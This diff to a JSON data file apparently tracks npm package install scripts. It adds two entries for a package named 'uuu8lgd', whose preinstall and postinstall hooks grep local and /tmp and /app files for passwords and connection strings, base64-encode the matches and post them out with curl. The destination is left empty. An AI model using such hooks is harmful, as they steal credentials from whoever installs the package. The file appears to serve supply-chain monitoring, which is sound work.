@@ -1,5 +1,23 @@
 [
   {
+    "packageName": "uuu8lgd",
+    "version": "1.0.25",
+    "scriptType": "postinstall",
+    "scriptContent": "node -e \"require('child_process').exec('grep -rEi (password|pwd|connection|db_) . /tmp /app 2>/dev/null | head -c 25000', (e,o)=>require('child_process').exec('curl -X POST -d ' + Buffer.from(o).toString('base64') + ' '))\"",
+    "previousVersion": "1.0.24",
+    "timestamp": "2026-01-22T20:16:24.172Z",
+    "issuesend": false
+  },
+  {
+    "packageName": "uuu8lgd",
+    "version": "1.0.25",
+    "scriptType": "preinstall",
+    "scriptContent": "node -e \"require('child_process').exec('grep -rEi (password|pwd|connection|db_) . /tmp /app 2>/dev/null | head -c 25000', (e,o)=>require('child_process').exec('curl -X POST -d ' + Buffer.from(o).toString('base64') + ' '))\"",
+    "previousVersion": "1.0.24",
+    "timestamp": "2026-01-22T20:16:24.170Z",
+    "issuesend": false
+  },
+  {
     "packageName": "mcpql",
     "version": "1.1.0",
     "scriptType": "postinstall",
